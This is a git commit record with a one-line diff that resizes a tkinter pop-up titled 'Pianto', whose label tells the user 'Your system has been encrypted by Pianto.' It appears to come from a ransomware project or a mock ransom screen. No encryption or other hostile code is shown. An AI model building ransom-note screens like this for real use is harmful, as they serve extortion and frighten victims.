99538e582c1cb84209c2b85a469a15c5d5218a8e
N0705 <nobimy05@gmail.com>
2025-09-03 21:39:51 -0400

    changed size of GUI pop up

--- main.py
+++ main.py
@@ -2,6 +2,7 @@ import tkinter as tk
 
 window = tk.Tk()
 window.title("Pianto")
+window.geometry("600x400")
 
 
 label = tk.Label(window, text="Your system has been encrypted by Pianto.", font=("Arial",12))
